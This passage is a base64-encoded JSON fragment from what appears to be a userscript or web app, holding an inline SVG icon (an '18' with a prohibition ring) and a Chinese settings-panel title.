aGVpZ2h0JTNBJTIwMWVtJTNCdmVydGljYWwtYWxpZ24lM0ElMjBtaWRkbGUlM0JmaWxsJTNBJTIwY3VycmVudENvbG9yJTNCb3ZlcmZsb3clM0ElMjBoaWRkZW4lM0IlMjIlMjB2aWV3Qm94JTNEJTIyMCUyMDAlMjAxMDI0JTIwMTAyNCUyMiUyMHZlcnNpb24lM0QlMjIxLjElMjIlMjB4bWxucyUzRCUyMmh0dHAlM0ElMkYlMkZ3d3cudzMub3JnJTJGMjAwMCUyRnN2ZyUyMiUzRSUzQ3BhdGglMjBkJTNEJTIyTTE0NC40MiUyMDUxMmEzNjcuNTIlMjAzNjcuNTIlMjAwJTIwMSUyMDAlMjA3MzUuMDQlMjAwJTIwMzY3LjUyJTIwMzY3LjUyJTIwMCUyMDElMjAwLTczNS4wNCUyMDB6JTIyJTIwZmlsbCUzRCUyMiUyM0JFREVGRiUyMiUyMCUyRiUzRSUzQ3BhdGglMjBkJTNEJTIyTTM1Ny42MyUyMDQxOC41OEgyNTMuMDd2LTYxLjg3YTIzOC4zJTIwMjM4LjMlMjAwJTIwMCUyMDAlMjA0Mi42OS0zLjcxJTIwMTI1LjE3JTIwMTI1LjE3JTIwMCUyMDAlMjAwJTIwMzcuMTItMTIuNjglMjA5MC40MiUyMDkwLjQyJTIwMCUyMDAlMjAwJTIwMjguNzctMjQuNDRxMTIuMDYtMTUuNDYlMjAxOC44Ny0zOS42aDYzLjczdjQ2NGgtODYuNjJ6TTU0MC4xJTIwNDczYTcxJTIwNzElMjAwJTIwMCUyMDEtMTYuNzEtMjAuNzNxLTYuNS0xMi4wNi05LjktMjkuMDh0LTMuNC00MS43NmExMTcuMjIlMjAxMTcuMjIlMjAwJTIwMCUyMDElMjA2LjUtMzcuNzQlMjA5My41NyUyMDkzLjU3JTIwMCUyMDAlMjAxJTIwMjAuNzMtMzQuMzRxMTQuMjMtMTUuMTUlMjAzNy4xMi0yNS4wNnQ1NS42OC05LjlxNjQuMzQlMjAwJTIwOTEuMjYlMjAzMC4zMnQyNi45MSUyMDg5LjA5YTE5OS4yNSUyMDE5OS4yNSUyMDAlMjAwJTIwMS0yLjQ3JTIwMzMuMSUyMDgyLjU3JTIwODIuNTclMjAwJTIwMCUyMDEtOSUyMDI2LjI5JTIwNjguMTIlMjA2OC4xMiUyMDAlMjAwJTIwMS0xNy45NCUyMDIwLjczcS0xMS40NiUyMDktMjkuMzklMjAxNi40djEuMjRRNzI5LjElMjA1MDAuMjUlMjA3NDQlMjA1Mjl0MTQuODUlMjA3OS41cTAlMjAzOC4zNy04LjY2JTIwNjUuMjd0LTI1LjA2JTIwNDMuNjJhOTcuNzQlMjA5Ny43NCUyMDAlMjAwJTIwMS0zOS45MSUyMDI0LjQ0cS0yMy41MiUyMDcuNzMtNTMuMjElMjA3LjczLTM3LjEyJTIwMC02Mi4xOC04LjY2VDUyOSUyMDcxNC42M1E1MTMuMTglMjA2OTclMjA1MDYuMzclMjA2NzAuN3QtNi44LTYxLjU2cTAtMjYlMjAzLjQtNDQuODZhMTA0LjM0JTIwMTA0LjM0JTIwMCUyMDAlMjAxJTIwMTEuNDUtMzMuMSUyMDg0LjgyJTIwODQuODIlMjAwJTIwMCUyMDElMjAyMC4xMS0yNC4xM3ExMi4wNi05Ljg5JTIwMzAtMTcuOTRBMTMxLjQ4JTIwMTMxLjQ4JTIwMCUyMDAlMjAxJTIwNTQwLjElMjA0NzN6JTIwbTQ3JTIwMTY1LjgxYTY2LjYyJTIwNjYuNjIlMjAwJTIwMCUyMDAlMjA0Ljk1JTIwMjEuNjUlMjAzMi4yOCUyMDMyLjI4JTIwMCUyMDAlMjAwJTIwMTMlMjAxNC44NXE5JTIwNS41NyUyMDI1LjA2JTIwNi4xOSUyMDE1LjQ2LTEuMjMlMjAyNC4xMy04YTM5LjU5JTIwMzkuNTklMjAwJTIwMCUyMDAlMjAxMi42OC0xNy4zMiUyMDc2LjUzJTIwNzYuNTMlMjAwJTIwMCUyMDAlMjA0LjY0LTIzLjgycTAuNjEtMTMuMyUyMDAuNjItMjguMTUlMjAwLTE2LjcxLTAuOTMtMzEuNTVhODYuNzIlMjA4Ni43MiUyMDAlMjAwJTIwMC01LjI2LTI2QTM5LjI1JTIwMzkuMjUlMjAwJTIwMCUyMDAlMjA2NTMlMjA1MjlxLTguNjctNi41LTI0LjEzLTYuNXQtMjQuMTMlMjA1Ljg4YTM0LjQxJTIwMzQuNDElMjAwJTIwMCUyMDAtMTIuNjglMjAxNS40N3EtNCUyMDkuNi00Ljk1JTIwMjMuMnQtMC45MyUyMDI5Ljd2MTQuODVxMC4wMSUyMDE0Ljg2JTIwMC45NCUyMDI3LjIzeiUyMG02My43My0xODQuNjhhMzkuMDYlMjAzOS4wNiUyMDAlMjAwJTIwMCUyMDExLjQ1LTE2LjA5JTIwNzUuMjklMjA3NS4yOSUyMDAlMjAwJTIwMCUyMDQuNjQtMjEuMzVxMC45My0xMS43NSUyMDAuOTMtMjIuMjclMjAwLTI2LjU5LTEwLjIxLTM5LjI5dC0yNi45MS0xMi42OHEtMTIuMzglMjAwLTIwLjQyJTIwNC42NGEzMS44JTIwMzEuOCUyMDAlMjAwJTIwMC0xMi4zNyUyMDEyLjY4JTIwNTUuOTElMjA1NS45MSUyMDAlMjAwJTIwMC01Ljg4JTIwMTguNTYlMjAxNTIuNyUyMDE1Mi43JTIwMCUyMDAlMjAwLTEuNTUlMjAyMi4yNyUyMDE3OC42NSUyMDE3OC42NSUyMDAlMjAwJTIwMCUyMDEuMjQlMjAyMSUyMDYyLjMlMjA2Mi4zJTIwMCUyMDAlMjAwJTIwNS4yNSUyMDE5LjI1JTIwMzUuNzMlMjAzNS43MyUyMDAlMjAwJTIwMCUyMDExLjc2JTIwMTQuMjNxNy43MyUyMDUuNTclMjAyMC43MyUyMDUuNTclMjAxMy42MSUyMDAlMjAyMS4zNS02LjV6JTIyJTIwZmlsbCUzRCUyMiUyMzc5QjNFOCUyMiUyMCUyRiUzRSUzQ3BhdGglMjBkJTNEJTIyTTUxMS45NCUyMDEwMmMtMjI2LjQ0JTIwMC00MTAlMjAxODMuNTYtNDEwJTIwNDEwczE4My41NiUyMDQxMCUyMDQxMCUyMDQxMCUyMDQxMC0xODMuNTYlMjA0MTAtNDEwLTE4My41Ni00MTAtNDEwLTQxMHolMjBtLTM1NSUyMDQxMGMwLTE5Ni4wNiUyMDE1OC45NC0zNTUlMjAzNTUtMzU1YTM1My42JTIwMzUzLjYlMjAwJTIwMCUyMDElMjAyMzAuODIlMjA4NS4yOUwyNDIuMjMlMjA3NDIuODJBMzUzLjYlMjAzNTMuNiUyMDAlMjAwJTIwMSUyMDE1Ni45NCUyMDUxMnolMjBtMzU1JTIwMzU1YTM1My42JTIwMzUzLjYlMjAwJTIwMCUyMDEtMjMwLjgyLTg1LjI5bDUwMC41My01MDAuNTNBMzUzLjYlMjAzNTMuNiUyMDAlMjAwJTIwMSUyMDg2Ni45NCUyMDUxMmMwJTIwMTk2LjA2LTE1OC45NCUyMDM1NS0zNTUlMjAzNTV6JTIyJTIwZmlsbCUzRCUyMiUyM0ZGNkFBOCUyMiUyMCUyRiUzRSUzQyUyRnN2ZyUzRSIsInRpdGxlIjoi4pqZIOi9u+WQiOmbhuiuvue9riDimpkifQ==
